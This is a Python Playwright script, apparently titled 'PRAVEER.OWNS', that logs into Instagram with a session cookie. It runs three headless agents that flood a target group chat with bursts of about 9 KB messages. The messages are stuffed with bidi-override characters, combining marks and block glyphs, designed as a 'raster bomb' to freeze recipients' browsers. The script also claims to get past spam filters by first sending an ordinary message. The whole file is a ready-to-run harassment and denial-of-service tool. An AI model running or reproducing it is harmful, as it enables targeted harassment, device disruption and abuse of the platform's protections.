# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (SLEDGEHAMMER-HYBRID V13)
# 📅 STATUS: FILTER-BYPASS | HEAVY-SATURATION | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 

def get_heavy_payload(agent_id):
    """Generates the heaviest possible legal-character payload."""
    u_id = random.randint(1000, 9999)
    # The 'Glue' forces the browser to treat the entire 9kb as a single object
    glue = "\u2060" 
    
    header = f"👑 𝕻𝕽𝕬𝖁𝕰𝕰𝕽 𝕻𝕬𝕻𝕬 𝕺𝕹 𝕿𝕺𝕻 👑\n🆔 {u_id}{glue}"
    
    # 🏗️ THE 'RASTER-BOMB'
    # Mixing Full Blocks (█) with BIDI-Overrides (\u202E) 
    # This forces the GPU to re-paint the entire chat window 20x per second.
    z_tower = "̸" * 165
    body = []
    for i in range(125):
        # We alternate direction to break the browser's layout cache
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # █ is a raster-heavy character that fills the GPU buffer
        body.append(f"{prefix}█_𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_█{z_tower}")
        
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    await asyncio.sleep(agent_id * 5)
    page = await context.new_page()
    await page.route("**/*.{png,jpg,jpeg,svg,mp4}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Syncing Matrix...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="commit", timeout=120000)
        
        while True:
            try:
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                # 1. SEND ACTIVE SIGNAL (Standard text to bypass filter)
                await box.fill(f"🚀 MATRIX NODE {os.environ.get('MACHINE_ID')} ACTIVE - AGENT {agent_id}")
                await page.keyboard.press("Enter")
                await asyncio.sleep(1)

                # 2. COMMENCE HEAVY STRIKE
                for _ in range(30):
                    payload = get_heavy_payload(agent_id)
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Heavy Impact Sent")
                    await asyncio.sleep(0.4) 
                
                await asyncio.sleep(5) 

            except Exception:
                await asyncio.sleep(5)
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="commit")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Error: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
